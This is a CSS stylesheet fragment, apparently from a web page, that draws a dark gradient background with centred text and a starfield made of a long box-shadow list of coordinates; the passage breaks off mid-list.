<style>html{height:100%}html body{width:100%;height:100%;margin:0}.container{display:block;position:relative;width:100%;height:100%;background:linear-gradient(to bottom,#020107 0,#201b46 100%)}.container .text{color:#fff;position:absolute;top:50%;right:50%;margin:-10px -75px 0 0;font-size:20px;font-family:sans-serif;font-weight:700}.stars{z-index:10;width:1px;height:1px;border-radius:50%;background:0 0;box-shadow:1813px 2121px #fff,510px 359px #fff,941px 460px #fff,1428px 435px #fff,246px 1687px #fff,1795px 2312px #fff,921px 2280px #fff,2488px 918px #fff,1640px 220px #fff,113px 418px #fff,1964px 417px #fff,2056px 1654px #fff,201px 830px #fff,2198px 344px #fff,1553px 1948px #fff,939px 2223px #fff,2170px 2187px #fff,2035px 2512px #fff,1264px 426px #fff,2254px 1937px #fff,2336px 2334px #fff,1461px 1270px #fff,164px 607px #fff,1972px 1781px #fff,1643px 739px #fff,1182px 456px #fff,1768px 2085px #fff,972px 1732px #fff,1029px 91px #fff,1967px 1701px #fff,1428px 1686px #fff,91px 2271px #fff,1816px 2486px #fff,1857px 852px #fff,1101px 232px #fff,700px 137px #fff,729px 1844px #fff,1720px 678px #fff,142px 638px #fff,536px 1645px #fff,2526px 579px #fff,2245px 955px #fff,1916px 854px #fff,1416px 265px #fff,1003px 2024px #fff,614px 1871px #fff,1458px 2357px #fff,2375px 268px #fff,1519px 2081px #fff,1368px 2080px #fff,1648px 317px #fff,1639px 2189px #fff,1038px 2520px #fff,296px 1366px #fff,1385px 708px #fff,510px 221px #fff,1426px 2339px #fff,1872px 1892px #fff,2139px 946px #fff,1488px 492px #fff,265px 651px #fff,2537px 1410px #fff,328px 678px #fff,1459px 1313px #fff,252px 2450px #fff,1557px 2533px #fff,531px 2325px #fff,530px 120px #fff,753px 1378px #fff,888px 1313px #fff,428px 1792px #fff,761px 754px #fff,615px 374px #fff,976px 93px #fff,382px 389px #fff,879px 2202px #fff,1382px 1931px #fff,959px 52px #fff,1435px 2012px #fff,487px 1155px #fff,746px 613px #fff,405px 323px #fff,463px 2302px #fff,1620px 1063px #fff,178px 2063px #fff,875px 797px #fff,2477px 1976px #fff,1156px 1886px #fff,2435px 1156px #fff,701px 65px #fff,926px 2234px #fff,2473px 1535px #fff,1647px 919px #fff,1707px 1731px #fff,343px 1819px #fff,474px 2266px #fff,1207px 1438px #fff,2536px 1276px #fff,2412px 2344px #fff,112px 1742px #fff,307px 263px #fff,1627px 822px #fff,1530px 2253px #fff,393px 1132px #fff,429px 1972px #fff,110px 882px #fff,1279px 685px #fff,113px 1412px #fff,896px 2117px #fff,2345px 1972px #fff,28px 1547px #fff,1112px 1675px #fff,2485px 823px #fff,1581px 2328px #fff,994px 346px #fff,1274px 2468px #fff,1655px 1595px #fff,2110px 1470px #fff,1972px 75px #fff,2417px 1616px #fff,588px 1802px #fff,518px 1075px #fff,1689px 106px #fff,922px 2062px #fff,927px 1274px #fff,2122px 160px #fff,473px 2559px #fff,554px 271px #fff,2263px 2151px #fff,1114px 392px #fff,887px 2442px #fff,805px 2405px #fff,2518px 1635px #fff,2492px 1835px #fff,779px 1793px #fff,1742px 2392px #fff,2331px 954px #fff,1584px 1948px #fff,86px 1682px #fff,650px 1353px #fff,949px 2123px #fff,707px 1225px #fff,142px 1365px #fff,1216px 1153px #fff,874px 1576px #fff,287px 1497px #fff,1629px 1436px #fff,517px 1633px #fff,793px 1762px #fff,13px 769px #fff,1259px 417px #fff,1528px 630px #fff,1279px 2052px #fff,1444px 1582px #fff,2201px 713px #fff,483px 59px #fff,2342px 968px #fff,290px 577px #fff,838px 1446px #fff,1619px 1540px #fff,2489px 778px #fff,352px 2172px #fff,1270px 1994px #fff,1519px 808px #fff,231px 1207px #fff,1450px 738px #fff,1149px 828px #fff,1382px 1051px #fff,2071px 1712px #fff,760px 1768px #fff,438px 2543px #fff,61px 2098px #fff,1321px 1503px #fff,794px 1402px #fff,1695px 757px #fff,1256px 977px #fff,1817px 1839px #fff,2382px 982px #fff,1896px 754px #fff,986px 237px #fff,2402px 1453px #fff,1030px 2128px #fff,2107px 1834px #fff,310px 1179px #fff,1986px 1380px #fff,1562px 126px #fff,764px 777px #fff,388px 493px #fff,1965px 1009px #fff,1796px 1344px #fff,1929px 1001px #fff,339px 2106px #fff,1299px 1976px #fff,2071px 1249px #fff,75px 1697px #fff,858px 1488px #fff,2489px 1446px #fff,2044px 1881px #fff,474px 1494px #fff,1898px 1339px #fff,594px 1596px #fff,2330px 2333px #fff,1px 1100px #fff,1414px 1338px #fff,1543px 1017px #fff,2504px 807px #fff,2258px 1851px #fff,225px 2294px #fff,1303px 786px #fff,1212px 322px #fff,1842px 1381px #fff,2208px 1656px #fff,1908px 998px #fff,67px 2370px #fff,1178px 2264px #fff,1659px 2500px #fff,418px 1869px #fff,380px 1832px #fff,2357px 695px #fff,1932px 559px #fff,1490px 1419px #fff,82px 771px #fff,2036px 2092px #fff,2045px 276px #fff,1085px 960px #fff,253px 647px #fff,2057px 1428px #fff,988px 1926px #fff,1777px 927px #fff,1707px 1398px #fff,926px 1038px #fff,2394px 2414px #fff,1928px 382px #fff,1404px 1804px #fff,1649px 2126px #fff,1790px 1107px #fff,2428px 643px #fff,2304px 61px #fff,1728px 760px #fff,1272px 2165px #fff,726px 2315px #fff,1113px 741px #fff,85px 485px #fff,1024px 1615px #fff,1963px 310px #fff,1019px 2558px #fff,2235px 1754px #fff,443px 2232px #fff,2454px 2125px #fff,178px 2124px #fff,538px 283px #fff,1171px 1403px #fff,434px 383px #fff,1269px 593px #fff,2058px 1391px #fff,1163px 584px #fff,129px 1158px #fff,1570px 703px #fff,2148px 472px #fff,2295px 502px #fff,934px 875px #fff,1129px 1171px #fff,1820px 2190px #fff,1889px 1847px #fff,240px 1384px #fff,663px 2216px #fff,1866px 48px #fff,379px 71px #fff,114px 1956px #fff,1603px 759px #fff,1896px 1885px #fff,1040px 1858px #fff,1677px 784px #fff,175px 1230px #fff,189px 457px #fff,643px 2072px #fff,193px 1718px #fff,1242px 1757px #fff,602px 1px #fff,1653px 1084px #fff,111px 54px #fff,573px 96px #fff,1374px 816px #fff,2258px 610px #fff,1475px 1988px #fff,1966px 1856px #fff,1083px 956px #fff,949px 1853px #fff,489px 2154px #fff,1318px 2528px #fff,1217px 2284px #fff,1720px 78px #fff,1813px 1219px #fff,848px 2415px #fff,1053px 520px #fff,162px 272px #fff,1466px 630px #fff,2489px 1198px #fff,1189px 185px #fff,813px 1101px #fff,1142px 2055px #fff,986px 1631px #fff,1854px 2078px #fff,2328px 2227px #fff,947px 1606px #fff,481px 195px #fff,783px 93px #fff,418px 1664px #fff,1424px 1698px #fff,101px 56px #fff,2330px 2328px #fff,2412px 1308px #fff,1220px 1757px #fff,618px 210px #fff,2018px 957px #fff,575px 1417px #fff,494px 2254px #fff,170px 2208px #fff,1437px 1974px #fff,1220px 1254px #fff,1128px 1048px #fff,736px 564px #fff,551px 342px #fff,748px 328px #fff,2252px 1420px #fff,224px 1066px #fff,489px 25px #fff,838px 1841px #fff,2374px 447px #fff,1903px 1061px #fff,1919px 2097px #fff,357px 1790px #fff,653px 254px #fff,1418px 1898px #fff,2277px 339px #fff,667px 996px #fff,1781px 833px #fff,956px 463px #fff,1549px 2027px #fff,2327px 165px #fff,577px 1605px #fff,954px 2125px #fff,1074px 1183px #fff,2029px 222px #fff,813px 429px #fff,2476px 442px #fff,2070px 315px #fff,2088px 151px #fff,749px 2505px #fff,803px 1424px #fff,595px 157px #fff,2363px 1943px #fff,766px 1707px #fff,2527px 69px #fff,2151px 404px #fff,932px 1869px #fff,349px 1183px #fff,608px 1495px #fff,1303px 1977px #fff,1745px 569px #fff,2135px 1068px #fff,782px 905px #fff,45px 666px #fff,530px 2px #fff,113px 2367px #fff,1961px 2311px #fff,1253px 2318px #fff,1113px 810px #fff,2500px 43px #fff,515px 1099px #fff,78px 1458px #fff,1718px 1057px #fff,1770px 888px #fff,278px 1401px #fff,1319px 1610px #fff,465px 1910px #fff,2492px 1706px #fff,1416px 1078px #fff,993px 7px #fff,253px 389px #fff,451px 2127px #fff,459px 901px #fff,24px 1569px #fff,1745px 1834px #fff,2465px 1794px #fff,864px 1233px #fff,1954px 2495px #fff,254px 1477px #fff,1782px 807px #fff,455px 1900px #fff,2366px 276px #fff,223px 37px #fff,1173px 1685px #fff,885px 1030px #fff,1710px 37px #fff,590px 2558px #fff,1115px 50px #fff,268px 475px #fff,2357px 2252px #fff,212px 894px #fff,2052px 2352px #fff,1491px 1538px #fff,1759px 966px #fff,1822px 985px #fff,117px 864px #fff,798px 902px #fff,260px 240px #fff,1768px 307px #fff,691px 733px #fff,1361px 2501px #fff,1638px 1226px #fff,849px 1778px #fff,1002px 2515px #fff,1654px 153px #fff,917px 2145px #fff,232px 2347px #fff,206px 776px #fff,1296px 336px #fff,121px 679px #fff,1522px 887px #fff,1797px 1667px #fff,1701px 2207px #fff,2055px 1655px #fff,1661px 437px #fff,144px 70px #fff,2036px 1751px #fff,2442px 1860px #fff,905px 726px #fff,1718px 1286px #fff,2488px 312px #fff,2113px 956px #fff,1662px 129px #fff,914px 374px #fff,1068px 2136px #fff,93px 134px #fff,793px 704px #fff,1760px 1460px #fff,298px 2259px #fff,2262px 335px #fff,1628px 1383px #fff,1117px 1967px #fff,1800px 1353px #fff,48px 747px #fff,825px 1244px #fff,851px 2039px #fff,1251px 424px #fff,1662px 542px #fff,279px 2458px #fff,1141px 1045px #fff,1547px 1933px #fff,2227px 1779px #fff,1144px 1471px #fff,235px 710px #fff,1225px 2476px #fff,1446px 591px #fff,681px 189px #fff,1524px 634px #fff,615px 1794px #fff,2048px 2534px #fff,1052px 2248px #fff,628px 2220px #fff,1666px 389px #fff,1346px 1600px #fff,436px 1505px #fff,413px 1770px #fff,1469px 1294px #fff,2193px 2360px #fff,2338px 167px #fff,1702px 2027px #fff,781px 887px #fff,1284px 835px #fff,928px 1731px #fff,2177px 934px #fff,791px 2252px #fff,328px 257px #fff,38px 2095px #fff,319px 1931px #fff,567px 272px #fff,1439px 1126px #fff,1383px 1510px #fff,894px 1861px #fff,792px 2260px #fff,1565px 1343px #fff,1939px 2298px #fff,1893px 714px #fff,1624px 206px #fff,1281px 537px #fff,1430px 2167px #fff,2234px 512px #fff,2076px 1235px #fff,2385px 275px #fff,1599px 1889px #fff,270px 2055px #fff,465px 1598px #fff,1603px 179px #fff,2533px 513px #fff,969px 1311px #fff,1792px 691px #fff,2191px 2024px #fff,852px 804px #fff,1653px 229px #fff,1501px 2432px #fff,431px 1571px #fff,375px 568px #fff,928px 793px #fff,103px 234px #fff,514px 2438px #fff,2133px 1146px #fff,796px 134px #fff,2214px 1850px #fff,1723px 384px #fff,1606px 1012px #fff,64px 936px #fff,998px 1977px #fff,542px 2110px #fff,402px 2384px #fff,1400px 2302px #fff,829px 2271px #fff,968px 924px #fff,446px 1994px #fff,2146px 114px #fff,2510px 1806px #fff,2426px 696px #fff,1876px 2186px #fff,843px 981px #fff,188px 1017px #fff,1629px 1858px #fff,2501px 1704px #fff,1062px 287px #fff,2178px 1651px #fff,2509px 936px #fff,1846px 1161px #fff,2285px 2058px #fff,16px 1968px #fff,69px 1600px #fff,864px 2279px #fff,349px 1277px #fff,1696px 755px #fff,1128px 2464px #fff,873px 1831px #fff,1500px 1424px #fff,1904px 1486px #fff,1490px 961px #fff,2423px 797px #fff,554px 180px #fff,1370px 223px #fff,313px 2395px #fff,233px 1770px #fff,1096px 2082px #fff,163px 848px #fff,1375px 2399px #fff,2150px 586px #fff,1888px 2031px #fff,2168px 412px #fff,1253px 1781px #fff,2381px 1947px #fff,422px 1988px #fff,2039px 2201px #fff,641px 446px #fff,1921px 2161px #fff,1855px 1195px #fff,1258px 485px #fff,1600px 2105px #fff,1483px 2303px #fff,265px 2443px #fff,2024px 1937px #fff,92px 2491px #fff,451px 1615px #fff,417px 2022px #fff,1294px 2497px #fff,1361px 565px #fff,1442px 894px #fff,513px 301px #fff,2124px 81px #fff,1648px 679px #fff,1093px 845px #fff,532px 1480px #fff,383px 909px #fff,1422px 829px #fff,1395px 33px #fff,575px 1630px #fff,2198px 673px #fff,1418px 1797px #fff,1091px 2405px #fff,1499px 1703px #fff,853px 488px #fff,2149px 2007px #fff,1126px 178px #fff,1620px 1036px #fff,654px 1912px #fff,290px 2521px #fff,2469px 131px #fff,794px 174px #fff,2235px 1157px #fff,2355px 725px #fff,2210px 1917px #fff,1264px 1608px #fff,655px 1394px #fff,1234px 751px #fff,1896px 2395px #fff,838px 1872px #fff,567px 1922px #fff,2054px 1299px #fff,1750px 1283px #fff,52px 1806px #fff,2497px 10px #fff,2114px 2035px #fff,194px 33px #fff,1353px 422px #fff,1787px 1751px #fff,2183px 1055px #fff,410px 1866px #fff,387px 1938px #fff,1338px 1017px #fff,2238px 1843px #fff,2019px 1920px #fff,92px 237px #fff,1298px 2542px #fff,1793px 1963px #fff,959px 2146px #fff,1042px 292px #fff,1416px 1189px #fff,666px 591px #fff,2125px 1732px #fff,1224px 276px #fff,2490px 1682px #fff,731px 1522px #fff,2558px 2207px #fff,2376px 814px #fff,2062px 1440px #fff,466px 327px #fff,222px 1551px #fff,1605px 52px #fff,834px 2081px #fff,2424px 834px #fff,1738px 2379px #fff,722px 1422px #fff,526px 627px #fff,1033px 1619px #fff,597px 1096px #fff,438px 1297px #fff,1233px 2042px #fff,2247px 992px #fff,2184px 1920px #fff,92px 2200px #fff,1046px 1349px #fff,1835px 2490px #fff,375px 569px #fff,1790px 1894px #fff,354px 2055px #fff,1764px 653px #fff,2357px 342px #fff,686px 2344px #fff,1939px 938px #fff,838px 406px #fff,1357px 1676px #fff,5px 1554px #fff,8px 173px #fff,123px 1262px #fff,526px 1515px #fff,2417px 1343px #fff,2058px 264px #fff,2553px 2016px #fff,406px 1873px #fff,250px 2186px #fff,1358px 2465px #fff,239px 1684px #fff,1639px 1257px #fff,1412px 227px #fff,1266px 258px #fff,689px 1950px #fff,870px 1493px #fff,1027px 532px #fff,973px 1897px #fff,219px 1557px #fff,1987px 1587px #fff,938px 222px #fff,2451px 1143px #fff,2038px 605px #fff,2367px 47px #fff,1908px 1439px #fff,2195px 2210px #fff,339px 1681px #fff,2417px 1078px #fff,1285px 2387px #fff,1167px 1022px #fff,54px 858px #fff,1242px 949px #fff,1011px 527px #fff,2267px 246px #fff,678px 1778px #fff,325px 500px #fff,755px 471px #fff,225px 1048px #fff,1763px 361px #fff,2106px 1570px #fff,2555px 2197px #fff,299px 1178px #fff,940px 1715px #fff,1834px 2116px #fff,1903px 1590px #fff,104px 357px #fff,2502px 868px #fff,1957px 1555px #fff,390px 156px #fff,1015px 1047px #fff,485px 1238px #fff,209px 2414px #fff,1146px 984px #fff,757px 1808px #fff,2237px 1287px #fff,300px 2120px #fff,2184px 1318px #fff,1890px 1161px #fff,795px 387px #fff,89px 1487px #fff,546px 1410px #fff,387px 1517px #fff,645px 1424px #fff,1076px 2249px #fff,333px 1653px #fff,2315px 1463px #fff,784px 907px #fff,1548px 1049px #fff,2118px 2305px #fff,645px 804px #fff,2285px 1703px #fff,2082px 934px #fff,520px 1474px #fff,2202px 2256px #fff,2222px 1202px #fff,272px 1579px #fff,2011px 240px #fff,1124px 2480px #fff,2239px 652px #fff,1694px 1427px #fff,106px 247px #fff,1251px 216px #fff,1742px 1355px #fff,846px 368px #fff,1711px 2013px #fff,1528px 2343px #fff,810px 497px #fff,82px 1949px #fff,894px 1316px #fff,377px 1463px #fff,315px 488px #fff,1693px 1945px #fff,802px 1180px #fff,825px 1761px #fff,1893px 984px #fff,121px 272px #fff,1581px 2389px #fff,204px 2279px #fff,1241px 1874px #fff,924px 922px #fff,535px 2291px #fff,1345px 1963px #fff,1056px 598px #fff,1193px 1515px #fff,1062px 1660px #fff,2378px 974px #fff,1654px 1802px #fff,314px 2154px #fff,1710px 2276px #fff,1511px 960px #fff,1020px 844px #fff,2459px 1748px #fff,1482px 1176px #fff,2466px 2048px #fff,1127px 2156px #fff,446px 839px #fff,2086px 1788px #fff,250px 2014px #fff,656px 1379px #fff,715px 2231px #fff,1755px 1541px #fff,1931px 1721px #fff,2388px 1737px #fff,2172px 1153px #fff,1044px 847px #fff,1687px 7px #fff,1080px 776px #fff,750px 729px #fff,1168px 2228px #fff,2020px 1570px #fff,844px 584px #fff,1063px 1386px #fff,2311px 1627px #fff,413px 437px #fff,1942px 938px #fff,2468px 2151px #fff,1359px 1249px #fff,1026px 800px #fff,1452px 1462px #fff,1309px 892px #fff,1828px 1676px #fff,447px 415px #fff,1372px 2059px #fff,820px 1548px #fff,205px 967px #fff,575px 1640px #fff,2016px 2179px #fff,2212px 171px #fff,1296px 1981px #fff,513px 1811px #fff,2321px 1097px #fff,2050px 1616px #fff,2211px 401px #fff,1141px 344px #fff,2034px 1295px #fff,1955px 1906px #fff,70px 2558px #fff,1896px 1181px #fff,2263px 941px #fff,2138px 2200px #fff,84px 978px #fff,2048px 240px #fff,225px 566px #fff,1646px 603px #fff,1954px 1957px #fff,1153px 2300px #fff,487px 1072px #fff,1136px 2349px #fff,1499px 1253px #fff,262px 599px #fff,848px 1112px #fff,2267px 1938px #fff,659px 1072px #fff,791px 791px #fff,372px 309px #fff,2180px 415px #fff,605px 2191px #fff,1814px 1383px #fff,875px 1135px #fff,1490px 449px #fff,2434px 1841px #fff,682px 303px #fff,1078px 711px #fff,1144px 2328px #fff,1677px 94px #fff,528px 704px #fff,1639px 1941px #fff,1938px 707px #fff,1617px 488px #fff,2199px 2009px #fff,1591px 613px #fff,1723px 1586px #fff,165px 1777px #fff,591px 1508px #fff,2440px 1712px #fff,764px 2514px #fff,1696px 384px #fff,1494px 652px #fff,1383px 2052px #fff,2260px 372px #fff,1634px 2114px #fff,1313px 2187px #fff,2118px 2222px #fff,42px 1669px #fff,271px 1846px #fff,266px 2349px #fff,407px 1545px #fff,769px 1146px #fff,403px 2266px #fff,1977px 2448px #fff,1705px 939px #fff,884px 1611px #fff,1002px 1259px #fff,1810px 1701px #fff,2514px 2160px #fff,2116px 636px #fff,1095px 2009px #fff,1776px 1359px #fff,2198px 694px #fff,536px 1413px #fff,2198px 390px #fff,2343px 1213px #fff,818px 1046px #fff,2040px 88px #fff,767px 28px #fff,1900px 1522px #fff,336px 62px #fff,2499px 1905px #fff,897px 140px #fff,2150px 522px #fff,658px 1420px #fff,2362px 1430px #fff,1621px 2071px #fff,1790px 575px #fff,1366px 2358px #fff,301px 1514px #fff,892px 2446px #fff,851px 645px #fff,617px 632px #fff,601px 2117px #fff,1605px 1267px #fff,1985px 2422px #fff,208px 2432px #fff,1616px 2230px #fff,2175px 902px #fff,718px 33px #fff,2326px 1604px #fff,475px 1256px #fff,2350px 999px #fff,1357px 887px #fff,1539px 1171px #fff,1486px 562px #fff,1975px 317px #fff,1816px 1331px #fff,2320px 432px #fff,1259px 86px #fff,1145px 1770px #fff,1587px 1941px #fff,220px 2116px #fff,880px 418px #fff,735px 55px #fff,384px 1818px #fff,1504px 203px #fff,2326px 1388px #fff,648px 1331px #fff,1565px 255px #fff,1327px 94px #fff,2361px 1239px #fff,2322px 2432px #fff,2356px 1511px #fff,743px 1429px #fff,515px 1300px #fff,2122px 1902px #fff,1939px 1721px #fff,1188px 1471px #fff,1745px 1131px #fff,1107px 1332px #fff,1658px 1615px #fff,498px 1595px #fff,1471px 1891px #fff,2495px 1952px #fff,14px 2416px #fff,1062px 1168px #fff,1878px 686px #fff,2399px 1948px #fff,900px 1041px #fff,1343px 416px #fff,1854px 1538px #fff,1143px 2393px #fff,1223px 1320px #fff,2377px 780px #fff,1237px 1395px #fff,901px 1128px #fff,1852px 1023px #fff,561px 1699px #fff,597px 1604px #fff,1337px 1503px #fff,1376px 502px #fff,1987px 1028px #fff,1600px 2335px #fff,1414px 1571px #fff,1694px 1148px #fff,1295px 41px #fff,592px 1494px #fff,437px 322px #fff,1389px 1940px #fff,2212px 365px #fff,1076px 759px #fff,347px 1847px #fff,1099px 876px #fff,200px 893px #fff,2288px 858px #fff,2023px 1036px #fff,1161px 2083px #fff,2454px 1424px #fff,1914px 1492px #fff,105px 2450px #fff,1522px 2333px #fff,1130px 1632px #fff,1358px 1698px #fff,689px 15px #fff,2520px 1822px #fff,128px 437px #fff,1920px 648px #fff,1519px 1119px #fff,1547px 1155px #fff,2350px 2394px #fff,1065px 1796px #fff,1931px 2299px #fff,92px 1012px #fff,750px 2181px #fff,740px 700px #fff,1580px 1128px #fff,1767px 1041px #fff,1728px 299px #fff,2214px 412px #fff,208px 1167px #fff,2281px 337px #fff,97px 2199px #fff,256px 2422px #fff,2090px 2109px #fff,1676px 498px #fff,976px 1373px #fff,258px 1042px #fff,62px 858px #fff,2177px 519px #fff,299px 1047px #fff,789px 1001px #fff,1857px 1379px #fff,1970px 2004px #fff,2422px 2111px #fff,1176px 255px #fff,2093px 1771px #fff,2011px 2124px #fff,931px 727px #fff,864px 2274px #fff,2039px 1945px #fff,1982px 2289px #fff,2298px 929px #fff,1795px 2110px #fff,3px 1996px #fff,2029px 1941px #fff,860px 2534px #fff,1653px 1759px #fff,975px 1152px #fff,1713px 10px #fff,1077px 1426px #fff,1906px 1220px #fff,1098px 822px #fff,446px 1606px #fff,2183px 1468px #fff,1571px 1969px #fff,2555px 1969px #fff,2363px 862px #fff,1772px 900px #fff,1027px 2215px #fff,2278px 56px #fff,1654px 2166px #fff,17px 184px #fff,1031px 2416px #fff,745px 943px #fff,186px 1996px #fff,33px 2187px #fff,1179px 104px #fff,911px 2159px #fff,8px 561px #fff,2407px 1684px #fff,1822px 2493px #fff,687px 1438px #fff,1343px 32px #fff,142px 1118px #fff,929px 2091px #fff,712px 27px #fff,309px 881px #fff,2356px 1746px #fff,1520px 1185px #fff,745px 1797px #fff,820px 1993px #fff,2521px 2054px #fff,112px 341px #fff,2032px 921px #fff,26px 1016px #fff,2429px 1708px #fff,369px 2104px #fff,888px 449px #fff,736px 921px #fff,136px 193px #fff,325px 2332px #fff,2315px 1066px #fff,793px 513px #fff,2333px 1941px #fff,1665px 2164px #fff,837px 879px #fff,728px 2155px #fff,1494px 379px #fff,1759px 176px #fff,1080px 2333px #fff,1054px 1826px #fff,1983px 2381px #fff,1259px 910px #fff,1167px 1878px #fff,1154px 260px #fff,1726px 425px #fff,3px 558px #fff,44px 2172px #fff,1299px 234px #fff,1359px 2239px #fff,2523px 912px #fff,1741px 1263px #fff,1370px 204px #fff,1961px 2351px #fff,2238px 2337px #fff,619px 967px #fff,1236px 1388px #fff,1009px 851px #fff,559px 950px #fff,1230px 755px #fff,1980px 1869px #fff,140px 1565px #fff,891px 2403px #fff,1627px 1292px #fff,2503px 603px #fff,592px 292px #fff,1188px 2068px #fff,1414px 1327px #fff,432px 365px #fff,2262px 1727px #fff,2011px 1833px #fff,528px 1412px #fff,530px 884px #fff,1453px 1134px #fff,506px 1701px #fff,1245px 1176px #fff,741px 2252px #fff,683px 659px #fff,953px 2342px #fff,1343px 1843px #fff,672px 1276px #fff,1743px 1388px #fff,1724px 1975px #fff,2197px 2427px #fff,1542px 429px #fff,1644px 937px #fff,1342px 2057px #fff,1309px 88px #fff,63px 1312px #fff,491px 1547px #fff,184px 2470px #fff,177px 651px #fff,648px 1180px #fff,1254px 1870px #fff,1354px 2464px #fff,1046px 507px #fff,2193px 2044px #fff,1022px 2022px #fff,2248px 417px #fff,2339px 1186px #fff,367px 743px #fff,2176px 195px #fff,1777px 2112px #fff,1366px 519px #fff,22px 449px #fff,1925px 2409px #fff,1785px 995px #fff,1276px 1543px #fff,2201px 1755px #fff,1191px 903px #fff,2529px 2524px #fff,2282px 1431px #fff,1491px 771px #fff,831px 2349px #fff,888px 2178px #fff,2390px 1194px #fff,1962px 2485px #fff,1023px 2273px #fff,296px 569px #fff,398px 1687px #fff,2314px 338px #fff,2125px 385px #fff,1134px 282px #fff,1695px 109px #fff,1315px 190px #fff,1148px 546px #fff,622px 2513px #fff,73px 116px #fff,2115px 2461px #fff,1356px 2525px #fff,1010px 2186px #fff,1056px 1130px #fff,1893px 908px #fff,1795px 1901px #fff,340px 1030px #fff,1380px 1482px #fff,617px 726px #fff,1300px 2235px #fff,2258px 133px #fff,804px 2505px #fff,2398px 1130px #fff,405px 19px #fff,1595px 1726px #fff,1374px 2460px #fff,2222px 1471px #fff,1650px 1175px #fff,284px 1040px #fff,279px 1245px #fff,837px 2165px #fff,769px 2050px #fff,1634px 297px #fff,1049px 2337px #fff,625px 2372px #fff,1328px 2245px #fff,1915px 107px #fff,1983px 1580px #fff,849px 2450px #fff,1161px 2420px #fff,2401px 2085px #fff,1691px 240px #fff,814px 494px #fff,786px 1198px #fff,20px 2394px #fff,1277px 250px #fff,2445px 2293px #fff,469px 1634px #fff,780px 2263px #fff,1708px 273px #fff,1361px 1277px #fff,2443px 1723px #fff,2258px 510px #fff,1515px 30px #fff,2386px 1071px #fff,2467px 765px #fff,460px 1942px #fff,1666px 2154px #fff,188px 2080px #fff,2034px 1521px #fff,2540px 1088px #fff,468px 1341px #fff,2329px 2421px #fff,1246px 221px #fff,148px 457px #fff,2229px 2018px #fff,1208px 431px #fff,1873px 345px #fff,56px 1969px #fff,2522px 1738px #fff,583px 635px #fff,171px 1512px #fff,1764px 504px #fff,1564px 1135px #fff,172px 586px #fff,68px 2197px #fff,1437px 1417px #fff,1560px 174px #fff,842px 722px #fff,2397px 27px #fff,1304px 953px #fff,1579px 563px #fff,1454px 1302px #fff,1117px 440px #fff,607px 819px #fff,28px 1681px #fff,499px 322px #fff,875px 1408px #fff,739px 992px #fff,503px 1782px #fff,800px 1069px #fff,1507px 2307px #fff,554px 1648px #fff,2282px 250px #fff,1113px 1696px #fff,1462px 993px #fff,1951px 927px #fff,2275px 1447px #fff,514px 640px #fff,2396px 1147px #fff,2184px 1294px #fff,934px 206px #fff,838px 2385px #fff,1250px 329px #fff,1906px 1550px #fff,972px 2408px #fff,2527px 1717px #fff,1781px 243px #fff,114px 23px #fff,52px 856px #fff,1829px 880px #fff,1098px 1731px #fff,514px 1348px #fff,920px 1293px #fff,255px 722px #fff,1443px 124px #fff,472px 1730px #fff,1351px 592px #fff,1445px 1931px #fff,2172px 905px #fff,1923px 430px #fff,1463px 52px #fff,1195px 961px #fff,614px 556px #fff,2510px 1314px #fff,39px 2053px #fff,358px 390px #fff,1487px 340px #fff,2147px 2198px #fff,2248px 31px #fff,462px 356px #fff,312px 1700px #fff,16px 844px #fff,2348px 2023px #fff,433px 711px #fff,49px 1718px #fff,345px 2164px #fff,2540px 1708px #fff,1470px 1620px #fff,2178px 2391px #fff,874px 1940px #fff,2283px 393px #fff,699px 988px #fff,1476px 44px #fff,31px 2056px #fff,2086px 1964px #fff,2195px 812px #fff,1884px 590px #fff,169px 2375px #fff,2103px 1428px #fff,979px 1774px #fff,981px 548px #fff,2027px 2388px #fff,1878px 1242px #fff,593px 2108px #fff,1167px 2058px #fff,719px 2380px #fff,1394px 95px #fff,2052px 2123px #fff,593px 718px #fff,1039px 690px #fff,1828px 1728px #fff,907px 1278px #fff,2405px 2309px #fff,2121px 2130px #fff,849px 197px #fff,914px 1773px #fff,407px 457px #fff,907px 686px #fff,712px 1221px #fff,563px 360px #fff,1909px 258px #fff,863px 1760px #fff,1872px 1836px #fff,235px 820px #fff,1324px 2047px #fff,402px 658px #fff,1554px 400px #fff,186px 1369px #fff,2298px 1695px #fff,1986px 1571px #fff,631px 1896px #fff,34px 981px #fff,1404px 331px #fff,585px 607px #fff,695px 979px #fff,2141px 371px #fff,1240px 1826px #fff,1611px 1242px #fff,2046px 875px #fff,1031px 2004px #fff,2122px 2499px #fff,993px 2115px #fff,2395px 2454px #fff,553px 284px #fff,1069px 1488px #fff,858px 693px #fff,1318px 278px #fff,2547px 1410px #fff,1186px 287px #fff,1717px 2184px #fff,2252px 2146px #fff,2083px 2451px #fff,1043px 1962px #fff,2249px 1036px #fff,1925px 1848px #fff,2363px 48px #fff,143px 1537px #fff,1327px 332px #fff,2091px 1434px #fff,149px 1193px #fff,948px 446px #fff,198px 2482px #fff,541px 1324px #fff,407px 1968px #fff,1115px 2099px #fff,1116px 514px #fff,1410px 19px #fff,581px 2046px #fff,367px 492px #fff,1757px 1677px #fff,432px 793px #fff,154px 17px #fff,480px 2112px #fff,591px 1510px #fff,167px 865px #fff,2228px 638px #fff,1655px 1418px #fff,35px 1298px #fff,1141px 91px #fff,2262px 1948px #fff,1787px 486px #fff,2466px 1130px #fff,2500px 1852px #fff,1825px 732px #fff,2460px 2483px #fff,1219px 362px #fff,840px 1497px #fff,1930px 757px #fff,1004px 1258px #fff,135px 1542px #fff,1304px 1346px #fff,1154px 1981px #fff,397px 720px #fff,812px 2147px #fff,1567px 234px #fff,2483px 317px #fff,131px 2295px #fff,2228px 1789px #fff,409px 156px #fff,905px 234px #fff,88px 626px #fff,270px 2305px #fff,2091px 590px #fff,375px 89px #fff,2386px 78px #fff,89px 1904px #fff,1146px 66px #fff,1458px 497px #fff,654px 102px #fff,1555px 2334px #fff,1080px 1533px #fff,1100px 2430px #fff,201px 249px #fff,1615px 1691px #fff,745px 257px #fff,437px 2244px #fff,751px 2115px #fff,2104px 1149px #fff,2461px 887px #fff,2502px 345px #fff,1263px 180px #fff,217px 987px #fff,1139px 857px #fff,1954px 1702px #fff,1721px 916px #fff,1909px 239px #fff,749px 1161px #fff,430px 1712px #fff,1445px 917px #fff,912px 292px #fff,2503px 1250px #fff,779px 1241px #fff,227px 1049px #fff,1134px 513px #fff,2168px 2261px #fff,1712px 287px #fff,720px 1969px #fff,449px 1418px #fff,1300px 315px #fff,2416px 834px #fff,104px 44px #fff,1561px 96px #fff,476px 2182px #fff,2173px 175px #fff,639px 1686px #fff,986px 2008px #fff,48px 2486px #fff,455px 1038px #fff,1275px 1113px 